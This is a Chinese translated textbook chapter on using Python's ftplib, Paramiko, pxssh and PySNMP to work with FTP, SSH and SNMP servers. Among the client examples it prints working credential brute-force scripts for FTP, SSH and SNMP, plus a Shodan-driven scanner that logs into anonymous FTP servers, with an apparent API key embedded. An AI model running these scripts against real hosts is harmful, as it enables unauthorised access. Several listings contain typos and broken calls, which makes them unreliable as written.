# 精通 Python 网络安全（三）

> 原文：[`zh.annas-archive.org/md5/2fd2c4f6d02f5009e067781f7b1aee0c`](https://zh.annas-archive.org/md5/2fd2c4f6d02f5009e067781f7b1aee0c)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第七章：与 FTP、SSH 和 SNMP 服务器交互

本章将帮助您了解允许我们与 FTP、SSH 和 SNMP 服务器交互的模块。在本章中，我们将探讨网络中的计算机如何相互交互。一些允许我们连接 FTP、SSH 和 SNMP 服务器的工具可以在 Python 中找到，其中我们可以突出显示 FTPLib、Paramiko 和 PySNMP。

本章将涵盖以下主题：

+   学习和理解 FTP 协议以及如何使用`ftplib`模块连接 FTP 服务器

+   学习和理解如何使用 Python 构建匿名 FTP 扫描器

+   学习和理解如何使用`Paramiko`模块连接 SSH 服务器

+   学习和理解如何使用`pxssh`模块连接 SSH 服务器

+   学习和理解 SNMP 协议以及如何使用`PySNMP`模块连接 SNMP 服务器

# 技术要求

本章的示例和源代码可在 GitHub 存储库的`chapter7`文件夹中找到：

[`github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security`](https://github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security).

在本章中，示例与 Python 3 兼容。

本章需要许多第三方软件包和 Python 模块，如`ftplib`、`Paramiko`、`pxssh`和`PySNMP`。您可以使用操作系统的软件包管理工具进行安装。以下是在 Ubuntu Linux 操作系统中使用 Python 3 安装这些模块的快速方法。我们可以使用以下`pip3`和`easy_install3`命令：

+   `sudo apt-get install python3`

+   `sudo [pip3|easy_install3] ftplib`

+   `sudo [pip3|easy_install3] paramiko`

+   `sudo [pip3|easy_install3] pysnmp`

# 连接 FTP 服务器

在本节中，我们将回顾 Python 标准库的`ftplib`模块，该模块为我们提供了创建 FTP 客户端所需的方法。

# 文件传输协议（FTP）

FTP 是一种用于在系统之间传输数据的协议，使用传输控制协议（TCP）端口`21`，允许在同一网络中连接的客户端和服务器交换文件。协议设计的方式定义了客户端和服务器不必在同一平台上运行；任何客户端和任何 FTP 服务器都可以使用不同的操作系统，并使用协议中定义的原语和命令来传输文件。

该协议专注于为客户端和服务器提供可接受的文件传输速度，但并未考虑诸如安全性之类的更重要概念。该协议的缺点是信息以明文形式传输，包括客户端在服务器上进行身份验证时的访问凭据。

# Python ftplib 模块

要了解有关`ftplib`模块的更多信息，可以查询官方文档：

[`docs.python.org/library/ftplib.html`](http://docs.python.org/library/ftplib.html)

`ftplib`是 Python 中的本地库，允许连接 FTP 服务器并在这些服务器上执行命令。它旨在使用少量代码创建 FTP 客户端并执行管理服务器例程。

它可用于创建自动化某些任务的脚本或对 FTP 服务器执行字典攻击。此外，它支持使用`FTP_TLS`类中定义的实用程序进行 TLS 加密连接。

在此屏幕截图中，我们可以看到在`ftplib`模块上执行`help`命令：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/d2ef454e-b939-44a7-8452-1ba78b959c30.png)

# 使用 FTP 传输文件

ftplib 可用于将文件传输到远程计算机并从远程计算机传输文件。FTP 类的构造方法（`method __init __（）`）接收`host`、`user`和`key`作为参数，因此在任何实例中传递这些参数到 FTP 时，可以节省使用 connect 方法（`host`、`port`、`timeout`）和登录（`user`、`password`）。

在这个截图中，我们可以看到更多关于`FTP`类和`init`方法构造函数的参数的信息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/e3b5caed-940e-4d0b-8a59-9857396b050b.png)

要连接，我们可以通过几种方式来实现。第一种是使用`connect()`方法，另一种是通过 FTP 类构造函数。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/4cecdc59-f643-40d2-8597-d1e69d152ae6.png)

在这个脚本中，我们可以看到如何连接到一个`ftp`服务器：

```py
from ftplib import FTP
server=''
# Connect with the connect() and login() methods
ftp = FTP()
ftp.connect(server, 21)
ftp.login(‘user’, ‘password’)
# Connect in the instance to FTP
ftp_client = FTP(server, 'user', 'password')
```

`FTP()`类以远程服务器、`ftp`用户的用户名和密码作为参数。

在这个例子中，我们连接到一个 FTP 服务器，以从`ftp.be.debian.org`服务器下载一个二进制文件。

在以下脚本中，我们可以看到如何连接到一个**匿名**FTP 服务器并下载二进制文件，而无需用户名和密码。

你可以在文件名为`ftp_download_file.py`中找到以下代码：

```py
#!/usr/bin/env python
import ftplib
FTP_SERVER_URL = 'ftp.be.debian.org'
DOWNLOAD_DIR_PATH = '/pub/linux/network/wireless/'
DOWNLOAD_FILE_NAME = 'iwd-0.3.tar.gz'

def ftp_file_download(path, username):
    # open ftp connection
    ftp_client = ftplib.FTP(path, username)
    # list the files in the download directory
    ftp_client.cwd(DOWNLOAD_DIR_PATH)
    print("File list at %s:" %path)
    files = ftp_client.dir()
    print(files)
    # download a file
    file_handler = open(DOWNLOAD_FILE_NAME, 'wb')
    ftp_cmd = 'RETR %s' %DOWNLOAD_FILE_NAME
    ftp_client.retrbinary(ftp_cmd,file_handler.write)
    file_handler.close()
    qftp_client.quit()

if __name__ == '__main__':
    ftp_file_download(path=FTP_SERVER_URL,username='anonymous')
```

# 使用 ftplib 来暴力破解 FTP 用户凭据

这个库的主要用途之一是检查 FTP 服务器是否容易受到使用字典的暴力攻击。例如，使用这个脚本，我们可以对 FTP 服务器执行使用用户和密码字典的攻击。我们测试所有可能的用户和密码组合，直到找到正确的组合。

当连接时，如果我们得到"`230 Login successful`"字符串作为答复，我们就会知道这个组合是一个好的组合。

你可以在文件名为`ftp_brute_force.py`中找到以下代码：

```py
import ftplib
import sys

def brute_force(ip,users_file,passwords_file):
    try:
        ud=open(users_file,"r")
        pd=open(passwords_file,"r")

        users= ud.readlines()
        passwords= pd.readlines()

        for user in users:
            for password in passwords:
                try:
                    print("[*] Trying to connect")
                    connect=ftplib.FTP(ip)
                    response=connect.login(user.strip(),password.strip())
                    print(response)
                    if "230 Login" in response:
                        print("[*]Sucessful attack")
                        print("User: "+ user + "Password: "+password)
                        sys.exit()
                    else:
                        pass
                except ftplib.error_perm:
                    print("Cant Brute Force with user "+user+ "and password "+password)
                connect.close

    except(KeyboardInterrupt):
         print("Interrupted!")
         sys.exit()

ip=input("Enter FTP SERVER:")
user_file="users.txt"
passwords_file="passwords.txt"
brute_force(ip,user_file,passwords_file)
```

# 使用 Python 构建匿名 FTP 扫描器

我们可以使用`ftplib`模块来构建一个脚本，以确定服务器是否提供匿名登录。

函数`anonymousLogin()`以主机名为参数，并返回描述匿名登录可用性的布尔值。该函数尝试使用匿名凭据创建 FTP 连接。如果成功，它返回值"`True`"。

你可以在文件名为`checkFTPanonymousLogin.py`中找到以下代码：

```py
import ftplib

def anonymousLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', '')
        print(ftp.getwelcome())
        ftp.set_pasv(1)
        print(ftp.dir())        
        print('\n[*] ' + str(hostname) +' FTP Anonymous Logon Succeeded.')
        return ftp
    except Exception as e:
        print(str(e))
        print('\n[-] ' + str(hostname) +' FTP Anonymous Logon Failed.')
        return False
```

在这个截图中，我们可以看到在允许**匿名登录**的服务器上执行前面的脚本的示例：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/8d8e37da-5b27-489a-a1ce-99005c35ff2b.png)

在这个例子中，`ftplib`模块被用来访问 FTP 服务器。在这个例子中，已经创建了一个脚本，其中使用**shodan**来提取允许匿名身份验证的 FTP 服务器列表，然后使用 ftplib 来获取根目录的内容。

你可以在文件名为`ftp_list_anonymous_shodan.py`中找到以下代码：

```py
import ftplib
import shodan
import socket
ips =[]

shodanKeyString = 'v4YpsPUJ3wjDxEqywwu6aF5OZKWj8kik'
shodanApi = shodan.Shodan(shodanKeyString)
results = shodanApi.search("port: 21 Anonymous user logged in")

for match in results['matches']:
 if match['ip_str'] is not None:
     ips.append(match['ip_str'])

print("Sites found: %s" %len(ips))

for ip in ips:
    try:
        print(ip)
        #server_name = socket.gethostbyaddr(str(ip))
        server_name = socket.getfqdn(str(ip))
        print("Connecting to ip: " +ip+ " / Server name:" + server_name[0])
        ftp = ftplib.FTP(ip)
        ftp.login()
        print("Connection to server_name %s" %server_name[0])
        print(ftp.retrlines('LIST'))
        ftp.quit()
        print("Existing to server_name %s" %server_name[0])
    except Exception as e:
        print(str(e))
        print("Error in listing %s" %server_name[0])
```

# 连接到 SSH 服务器

在本节中，我们将回顾 Paramiko 和`pxssh`模块，这些模块为我们提供了创建 SSH 客户端所需的方法。

# 安全外壳（SSH）协议

SSH 已经成为执行两台计算机之间的安全数据通信的非常流行的网络协议。通信中的双方都使用 SSH 密钥对来加密他们的通信。每个密钥对都有一个私钥和一个公钥。公钥可以发布给任何对其感兴趣的人。私钥始终保持私密，并且除了密钥的所有者之外，对所有人都是安全的。

公钥和私钥可以由认证机构（CA）生成并进行数字签名。这些密钥也可以使用命令行工具生成，例如`ssh-keygen`。

当 SSH 客户端安全连接到服务器时，它会在一个特殊的文件中注册服务器的公钥，该文件以一种隐藏的方式存储，称为`/.ssh/known_hosts`文件。如果在服务器端，访问必须限制在具有特定 IP 地址的某些客户端，那么允许主机的公钥可以存储在另一个特殊文件中，称为`ssh_known_hosts`。

# Paramiko 简介

Paramiko 是一个用 Python 编写的库，支持 SSHV1 和 SSHV2 协议，允许创建客户端并连接到 SSH 服务器。它依赖于**PyCrypto**和**cryptography**库进行所有加密操作，并允许创建本地，远程和动态加密隧道。

在此库的主要优势中，我们可以强调：

+   它以舒适且易于理解的方式封装了针对 SSH 服务器执行自动化脚本所涉及的困难，适用于任何程序员

+   它通过`PyCrypto`库支持 SSH2 协议，该库使用它来实现公钥和私钥加密的所有细节

+   它允许通过公钥进行身份验证，通过密码进行身份验证，并创建 SSH 隧道

+   它允许我们编写强大的 SSH 客户端，具有与其他 SSH 客户端（如 Putty 或 OpenSSH-Client）相同的功能

+   它支持使用 SFTP 协议安全地传输文件

您可能还对使用基于 Paramiko 的`pysftp`模块感兴趣。有关此软件包的更多详细信息，请访问 PyPI：[`pypi.python.org/pypi/pysftp.`](https://pypi.python.org/pypi/pysftp)

# 安装 Paramiko

您可以直接从 pip Python 存储库安装 Paramiko，使用经典命令：`pip install paramiko`。您可以在 Python 2.4 和 3.4+中安装它，并且必须在系统上安装一些依赖项，例如`PyCrypto`和`Cryptography`模块，具体取决于您要安装的版本。这些库为 SSH 协议提供了基于 C 的低级加密算法。在官方文档中，您可以看到如何安装它以及不同的可用版本：

[`www.paramiko.org`](http://www.paramiko.org)

有关 Cryptography 的安装详细信息，请访问：

[`cryptography.io/en/latest/installation`](https://cryptography.io/en/latest/installation)

# 使用 Paramiko 建立 SSH 连接

我们可以使用`Paramiko`模块创建 SSH 客户端，然后将其连接到 SSH 服务器。此模块将提供`SSHClient()`类，该类提供了一种安全启动服务器连接的接口。这些说明将创建一个新的 SSHClient 实例，并通过调用`connect()`方法连接到 SSH 服务器：

```py
import paramiko
ssh_client = paramiko.SSHClient()
ssh_client.connect(‘host’,username='username', password='password')
```

默认情况下，此客户端类的`SSHClient`实例将拒绝连接到没有在我们的`known_hosts`文件中保存密钥的主机。使用`AutoAddPolicy()`类，您可以设置接受未知主机密钥的策略。现在，您需要在`ssh_client`对象上运行`set_missing_host_key_policy()`方法以及以下参数。

通过此指令，Paramiko 会自动将远程服务器的指纹添加到操作系统的主机文件中。现在，由于我们正在执行自动化，我们将通知 Paramiko 首次接受这些密钥，而不会中断会话或提示用户。这将通过`client.set_missing_host_key_policy`，然后`AutoAddPolicy()`完成：

```py
ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
```

如果您需要仅限于特定主机接受连接，则可以使用`load_system_host_keys()`方法添加系统主机密钥和系统指纹：

```py
ssh_client.load_system_host_keys()
```

连接到 SSH 服务器的另一种方法是通过`Transport()`方法，它提供了另一种类型的对象来对服务器进行身份验证：

```py
transport = paramiko.Transport(ip)
try:
    transport.start_client()
except Exception as e:
    print(str(e))
try:
    transport.auth_password(username=user,password=passwd)
except Exception as e:
    print(str(e))

if transport.is_authenticated():
    print("Password found " + passwd)
```

我们可以查询`transport`子模块帮助以查看我们可以调用的方法，以连接并获取有关 SSH 服务器的更多信息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/c067aa76-5003-4dab-9d30-69fc7217121e.png)

这是用于验证用户和密码的方法：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/c00488c6-1363-4ab1-b1f1-32b4d9a8c2a8.png)

`open_session`方法允许我们打开一个新会话以执行命令：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/552a2b7b-c440-4bfb-a87e-84b0287f967f.png)

# 使用 Paramiko 运行命令

现在我们使用 Paramiko 连接到远程主机，我们可以使用这个连接在远程主机上运行命令。要执行命令，我们可以简单地调用`connect()`方法，以及目标`hostname`和 SSH 登录凭据。要在目标主机上运行任何命令，我们需要调用`exec_command()`方法，并将命令作为参数传递：

```py
ssh_client.connect(hostname, port, username, password)
stdin, stdout, stderr = ssh_client.exec_command(cmd)
for line in stdout.readlines():
    print(line.strip())
ssh.close()
```

以下代码清单显示了如何登录到目标主机，然后运行`ifconfig`命令。下一个脚本将建立到本地主机的 SSH 连接，然后运行`ifconfig`命令，这样我们就可以看到我们正在连接的机器的网络配置。

使用这个脚本，我们可以创建一个可以自动化许多任务的交互式 shell。我们创建了一个名为`ssh_command`的函数，它连接到 SSH 服务器并运行单个命令。

要执行命令，我们使用`ssh_session`对象的`exec_command()`方法，该对象是在登录到服务器时从打开会话中获得的。

您可以在文件名为`SSH_command.py`的文件中找到以下代码：

```py
#!/usr/bin/env python3
import getpass
import paramiko

HOSTNAME = 'localhost'
PORT = 22

def run_ssh_command(username, password, command, hostname=HOSTNAME, port=PORT):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.load_system_host_keys()
    ssh_client.connect(hostname, port, username, password)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        stdin, stdout, stderr = ssh_client.exec_command(command)
        print(stdout.read())
    return

if __name__ == '__main__':
    username = input("Enter username: ")
    password = getpass.getpass(prompt="Enter password: ")
    command= 'ifconfig'
    run_ssh_command(username, password, command)
```

在这个例子中，我们执行了与上一个脚本相同的功能，但在这种情况下，我们使用`Transport`类与 SSH 服务器建立连接。要能够执行命令，我们必须在`transport`对象上预先打开一个会话。

您可以在文件名为`SSH_transport.py`的文件中找到以下代码：

```py
import paramiko

def ssh_command(ip, user, passwd, command):
    transport = paramiko.Transport(ip)
    try:
        transport.start_client()
    except Exception as e:
        print(e)

    try:
        transport.auth_password(username=user,password=passwd)
    except Exception as e:
        print(e)

    if transport.is_authenticated():
        print(transport.getpeername())
        channel = transport.opem_session()
        channel.exec_command(command)
        response = channel.recv(1024)
        print('Command %r(%r)-->%s' % (command,user,response))

if __name__ == '__main__':
    username = input("Enter username: ")
    password = getpass.getpass(prompt="Enter password: ")
    command= 'ifconfig'
    run_ssh_command('localhost',username, password, command)
```

# 使用暴力破解处理进行 SSH 连接

在这个例子中，我们执行了一个**SSHConnection**类，它允许我们初始化`SSHClient`对象并实现以下方法：

+   `def ssh_connect (self, ip_address, user, password, code = 0)`

+   `def startSSHBruteForce (self, host)`

第一个方法尝试连接到特定 IP 地址，参数是用户名和密码。

第二个方法接受两个读取文件作为输入（`users.txt`，`passwords.txt`），并通过暴力破解过程，尝试测试从文件中读取的所有可能的用户和密码组合。我们尝试用户名和密码的组合，如果可以建立连接，我们就从已连接的服务器的控制台执行命令。

请注意，如果我们遇到连接错误，我们有一个异常块，在那里我们执行不同的处理，具体取决于连接失败是由于身份验证错误（`paramiko.AuthenticationException`）还是与服务器的连接错误（`socket.error`）。

与用户和密码相关的文件是简单的纯文本文件，包含数据库和操作系统的常见默认用户和密码。文件的示例可以在 fuzzdb 项目中找到：

[`github.com/fuzzdb-project/fuzzdb/tree/master/wordlists-user-passwd`](https://github.com/fuzzdb-project/fuzzdb/tree/master/wordlists-user-passwd)

您可以在文件名为`SSHConnection_brute_force.py`的文件中找到以下代码：

```py
import paramiko

class SSHConnection:

    def __init__(self):
        #ssh connection with paramiko library
        self.ssh = paramiko.SSHClient()

    def ssh_connect(self,ip,user,password,code=0): self.ssh.load_system_host_keys()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print("[*] Testing user and password from dictionary")
        print("[*] User: %s" %(user))
        print("[*] Pass :%s" %(password))
        try:
            self.ssh.connect(ip,port=22,username=user,password=password,timeout=5)
        except paramiko.AuthenticationException:
            code = 1
        except socket.error as e:
            code = 2
            self.ssh.close()
        return code
```

对于暴力破解过程，我们可以定义一个函数，该函数迭代用户和密码文件，并尝试为每个组合建立`ssh`连接：

```py
 def startSSHBruteForce(self,host): try:
            #open files dictionary
            users_file = open("users.txt")
            passwords_file = open("passwords.txt")
            for user in users_file.readlines():
                for password in passwords_file.readlines():
                    user_text = user.strip("\n")
                    password_text = password.strip("\n")
                    try:
                    #check connection with user and password
                        response = self.ssh_connect(host,user_text,password_text)
                        if response == 0:
                            print("[*] User: %s [*] Pass Found:%s" %(user_text,password_text))
                            stdin,stdout,stderr = self.ssh.exec_command("ifconfig")
                            for line in stdout.readlines():
                                print(line.strip())
                            sys.exit(0)
                        elif response == 1:
                            print("[*]Login incorrect")
                        elif response == 2:
                            print("[*] Connection could not be established to %s" %(host))
                            sys.exit(2)
                except Exception as e:
                    print("Error ssh connection")
                    pass
            #close files
            users_file.close()
            passwords_file.close()
        except Exception as e:
            print("users.txt /passwords.txt Not found")
            pass
```

# 使用 pxssh 进行 SSH 连接

`pxssh`是一个基于 Pexpect 的 Python 模块，用于建立 SSH 连接。它的类扩展了`pexpect.spawn`，以专门设置 SSH 连接。

`pxssh`是一个专门的模块，提供了特定的方法来直接与 SSH 会话交互，比如`login()`，`logout()`和`prompt()`。

**pxssh 文档**

我们可以在`readthedocs`网站上找到`Pexpect`模块的官方文档，网址为[`pexpect.readthedocs.io/en/stable/api/pxssh.html.`](https://pexpect.readthedocs.io/en/stable/index.html)

此外，我们可以使用 Python 终端的`help`命令获取更多信息：

```py
 import pxssh
 help(pxssh)
```

# 在远程 SSH 服务器上运行命令

这个例子导入了**getpass**模块，它将提示主机、用户和密码，建立连接，并在远程服务器上运行一些命令。

您可以在文件名`pxsshConnection.py`中找到以下代码：

```py
import pxssh
import getpass

try: 
    connection = pxssh.pxssh()
    hostname = input('hostname: ')
    username = input('username: ')
    password = getpass.getpass('password: ')
    connection.login (hostname, username, password)
    connection.sendline ('ls -l')
    connection.prompt()
    print(connection.before)
    connection.sendline ('df')
    connection.prompt()
    print(connection.before)
    connection.logout()
except pxssh.ExceptionPxssh as e:
    print("pxssh failed on login.")
    print(str(e))
```

我们可以创建特定的方法来建立`连接`和`发送`命令。

您可以在文件名`pxsshCommand.py`中找到以下代码：

```py
#!/usr/bin/python
# -*- coding: utf-8 -*-
import pxssh

hostname = 'localhost'
user = 'user'
password = 'password'
command = 'df -h'

def send_command(ssh_session, command):
    ssh_session.sendline(command)
    ssh_session.prompt()
    print(ssh_session.before)

def connect(hostname, username, password):
 try:
     s = pxssh.pxssh()
     if not s.login(hostname, username, password):
         print("SSH session failed on login.")
     return s
 except pxssh.ExceptionPxssh as e:
     print('[-] Error Connecting')
     print(str(e))

def main():
    session = connect(host, user, password)
    send_command(session, command)
    session.logout()

if __name__ == '__main__':
    main()
```

# 与 SNMP 服务器连接

在本节中，我们将回顾 PySNMP 模块，该模块为我们提供了与 SNMP 服务器轻松连接所需的方法。

# 简单网络管理协议（SNMP）

SMNP 是一种基于用户数据报协议（UDP）的网络协议，主要用于路由器、交换机、服务器和虚拟主机的管理和网络设备监视。它允许设备配置、性能数据和用于控制设备的命令的通信。

SMNP 基于将可监视的设备分组的社区的定义，旨在简化网络段中机器的监视。操作很简单，网络管理器向设备发送 GET 和 SET 请求，带有 SNMP 代理的设备根据请求提供信息。

关于**安全性**，SNMP 协议根据协议版本号提供多种安全级别。在 SNMPv1 和 v2c 中，数据受到称为社区字符串的密码保护。在 SNMPv3 中，需要用户名和密码来存储数据。

SNMP 协议的主要元素是：

+   **SNMP 管理器**：它的工作原理类似于监视器。它向一个或多个代理发送查询并接收答复。根据社区的特性，它还允许编辑我们正在监视的机器上的值。

+   **SNMP 代理**：属于某个社区并且可以由 SNMP 管理器管理的任何类型的设备。

+   **SNMP 社区**：表示代理的分组的文本字符串。

+   **管理信息库（MIB）**：形成可以针对 SNMP 代理进行的查询的基础的信息单元。它类似于数据库信息，其中存储了每个设备的信息。MIB 使用包含对象标识符（OID）的分层命名空间。

+   **对象标识符（OID）**：表示可以读取并反馈给请求者的信息。用户需要知道 OID 以查询数据。

# PySNMP

在 Python 中，您可以使用名为 PySNMP 的第三方库与**snmp 守护程序**进行接口。

您可以使用以下`pip`命令安装 PySNMP 模块：

`$ pip install pysnmp`

在此截图中，我们可以看到我们需要为此模块安装的依赖项：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/100106a6-418e-4716-910b-e5d82c447a55.png)

我们可以看到，安装 PySNMP 需要`pyasn1`包。ASN.1 是一种标准和符号，用于描述在电信和计算机网络中表示、编码、传输和解码数据的规则和结构。

pyasn1 可在 PyPI 存储库中找到：[`pypi.org/project/pyasn1/`](https://pypi.org/project/pyasn1)。在 GitHub 存储库[`github.com/etingof/pyasn1`](https://github.com/etingof/pyasn1)中，我们可以看到如何使用此模块与 SNMP 服务器交互时获取记录信息。

对于此模块，我们可以在以下页面找到官方文档：

[`pysnmp.sourceforge.net/quick-start.html`](http://pysnmp.sourceforge.net/quick-start.html)

执行 SNMP 查询的主要模块如下：

`pysnmp.entity.rfc3413.oneliner.cmdgen`

这里是允许您查询 SNMP 服务器的`CommandGenerator`类：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/00c60189-fa6a-4a87-8098-2cc76611c06a.png)

在此代码中，我们可以看到`CommandGenerator`类的基本用法：

```py
from pysnmp.entity.rfc3413.oneliner import cmdgen 
cmdGen = cmdgen.CommandGenerator()
cisco_contact_info_oid = "1.3.6.1.4.1.9.2.1.61.0"
```

我们可以使用`getCmd()`方法执行 SNMP。结果被解包成各种变量。这个命令的输出包括一个四值元组。其中三个与命令生成器返回的错误有关，第四个（`varBinds`）与绑定返回数据的实际变量有关，并包含查询结果：

```py
errorIndication, errorStatus, errorIndex, varBinds = cmdGen.getCmd(cmdgen.CommunityData('secret'),
cmdgen.UdpTransportTarget(('172.16.1.189', 161)),
cisco_contact_info_oid)

for name, val in varBinds:
    print('%s = %s' % (name.prettyPrint(), str(val)))
```

你可以看到**cmdgen**接受以下**参数**：

+   **CommunityData():** 将 community 字符串设置为 public。

+   **UdpTransportTarget():** 这是主机目标，SNMP 代理正在运行的地方。这是指定主机名和 UDP 端口的配对。

+   **MibVariable:** 这是一个值元组，包括 MIB 版本号和 MIB 目标字符串（在本例中是`sysDescr`；这是指系统的描述）。

在这些例子中，我们看到一些脚本的目标是**获取远程 SNMP 代理的数据**。

你可以在文件名为`snmp_example1.py`中找到以下代码：

```py
from pysnmp.hlapi import *

SNMP_HOST = '182.16.190.78'
SNMP_PORT = 161
SNMP_COMMUNITY = 'public'

errorIndication, errorStatus, errorIndex, varBinds = next(
 getCmd(SnmpEngine(),
 CommunityData(SNMP_COMMUNITY, mpModel=0),
 UdpTransportTarget((SNMP_HOST, SNMP_PORT)),
 ContextData(),
 ObjectType(ObjectIdentity('SNMPv2-MIB', 'sysDescr', 0)))
)
if errorIndication:
    print(errorIndication)
elif errorStatus:
    print('%s at %s' % (errorStatus.prettyPrint(),errorIndex and varBinds[int(errorIndex)-1][0] or '?'))
else:
    for varBind in varBinds:
        print(' = '.join([ x.prettyPrint() for x in varBind ]))
```

如果我们尝试执行先前的脚本，我们会看到已注册的 SNMP 代理的公共数据：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/2dbc8623-071f-4a68-8948-6d7f9f10b426.png)

你可以在文件名为`snmp_example2.py`中找到以下代码：

```py
from snmp_helper import snmp_get_oid,snmp_extract

SNMP_HOST = '182.16.190.78'
SNMP_PORT = 161

SNMP_COMMUNITY = 'public'
a_device = (SNMP_HOST, SNMP_COMMUNITY , SNMP_PORT)
snmp_data = snmp_get_oid(a_device, oid='.1.3.6.1.2.1.1.1.0',display_errors=True)
print(snmp_data)

if snmp_data is not None:
    output = snmp_extract(snmp_data)
    print(output)
```

如果我们尝试执行先前的脚本，我们会看到已注册的 SNMP 代理的公共数据：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/1c0ec4d8-545b-4dc6-aef6-d0b856801159.png)

你可以在文件名为`snmp_example3.py`中找到以下代码：

```py
from pysnmp.entity.rfc3413.oneliner import cmdgen

SNMP_HOST = '182.16.190.78'
SNMP_PORT = 161
SNMP_COMMUNITY = 'public'

snmpCmdGen = cmdgen.CommandGenerator()
snmpTransportData = cmdgen.UdpTransportTarget((SNMP_HOST ,SNMP_PORT ))

error,errorStatus,errorIndex,binds = snmpCmdGen
getCmd(cmdgen.CommunityData(SNMP_COMMUNITY),snmpTransportData,"1.3.6.1.2.1.1.1.0","1.3.6.1.2.1.1.3.0","1.3.6.1.2.1.2.1.0")

if error:
    print("Error"+error)
else:
    if errorStatus:
        print('%s at %s' %(errorStatus.prettyPrint(),errorIndex and  binds[int(errorIndex)-1] or '?'))
    else:
        for name,val in binds:
            print('%s = %s' % (name.prettyPrint(),val.prettyPrint()))
```

如果我们尝试执行先前的脚本，我们会看到已注册的 SNMP 代理的公共数据：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/bcc8af0d-d614-4382-9daa-89e59139e964.png)

在这个例子中，我们尝试为特定的 SNMP 服务器查找 community。为此任务，我们首先从 fuzzdb 获取包含可用 community 列表的文件`wordlist-common-snmp-community-strings.txt`：

[`github.com/fuzzdb-project/fuzzdb/blob/master/wordlists-misc/wordlist-common-snmp-community-strings.txt`](https://github.com/fuzzdb-project/fuzzdb/blob/master/wordlists-misc/wordlist-common-snmp-community-strings.txt)

你可以在文件名为`snmp_brute_force.py`中找到以下代码：

```py
from pysnmp.entity.rfc3413.oneliner import cmdgen

SNMP_HOST = '182.16.190.78'
SNMP_PORT = 161

cmdGen = cmdgen.CommandGenerator()
fd = open("wordlist-common-snmp-community-strings.txt")
for community in fd.readlines():
    snmpCmdGen = cmdgen.CommandGenerator()
    snmpTransportData = cmdgen.UdpTransportTarget((SNMP_HOST, SNMP_PORT),timeout=1.5,retries=0)

    error, errorStatus, errorIndex, binds = snmpCmdGen.getCmd(cmdgen.CommunityData(community), snmpTransportData, "1.3.6.1.2.1.1.1.0", "1.3.6.1.2.1.1.3.0", "1.3.6.1.2.1.2.1.0")
    # Check for errors and print out results
    if error:
        print(str(error)+" For community: %s " %(community))
    else:
        print("Community Found '%s' ... exiting." %(community))
        break
```

要获取服务器和 SNMP 代理，我们可以在 Shodan 中使用 SNMP 协议和端口`161`进行搜索，然后获得以下结果：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/f5f7f1fe-e4fd-4ced-8d3f-5fd6802d5712.png)

一个有趣的工具，用于检查与 SNMP 服务器的连接并获取 SNMP 变量的值，是`snmp-get`，它适用于 Windows 和 Unix 环境：

[`snmpsoft.com/shell-tools/snmp-get/`](https://snmpsoft.com/shell-tools/snmp-get/)

使用 Windows 的**SnmpGet**，我们可以获取有关 SNMP 服务器的信息。

在下面的截图中，我们可以看到这个工具的命令行参数。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/3bbda7d1-2b15-454b-854c-ab28b72cb10c.png)

此外，Ubuntu 操作系统也有类似的工具：

[`manpages.ubuntu.com/manpages/bionic/man1/snmpget.1.html`](http://manpages.ubuntu.com/manpages/bionic/man1/snmpget.1.html)

# 总结

本章的一个目标是描述允许我们连接到 FTP、SSH 和 SNMP 服务器的模块。在本章中，我们遇到了几种网络协议和 Python 库，用于与远程系统进行交互。此外，我们探讨了如何通过 SNMP 执行网络监控。我们使用 PySNMP 模块简化和自动化了我们的 SNMP 查询。

在下一章节中，我们将探索用于与 Nmap 扫描仪一起工作的编程包，并获取有关正在运行的服务器上的服务和漏洞的更多信息。

# 问题

1.  使用`connect()`和`login()`方法连接到 FTP 服务器的 ftplib 模块的方法是什么？

1.  ftplib 模块的哪种方法允许其列出 FTP 服务器的文件？

1.  Paramiko 模块的哪种方法允许我们连接到 SSH 服务器，以及使用什么参数（主机、用户名、密码）？

1.  Paramiko 模块的哪种方法允许我们打开一个会话以便随后执行命令？

1.  使用我们知道其路径和密码的 RSA 证书登录到 SSH 服务器的方式是什么？

1.  PySNMP 模块的主要类是允许对 SNMP 代理进行查询的类是什么？

1.  如何通知 Paramiko 在第一次接受服务器密钥而不中断会话或提示用户的指令是什么？

1.  通过`Transport()`方法连接到 SSH 服务器的方式是提供另一种对象来对服务器进行身份验证。

1.  基于 Paramiko 的 Python FTP 模块是以安全方式与 FTP 服务器建立连接的模块是什么？

1.  我们需要使用 ftplib 的哪种方法来下载文件，以及我们需要执行的`ftp`命令是什么？

# 进一步阅读

在这些链接中，您将找到有关提到的工具的更多信息以及用于搜索一些提到的模块的官方 Python 文档：

+   [`www.paramiko.org`](http://www.paramiko.org)

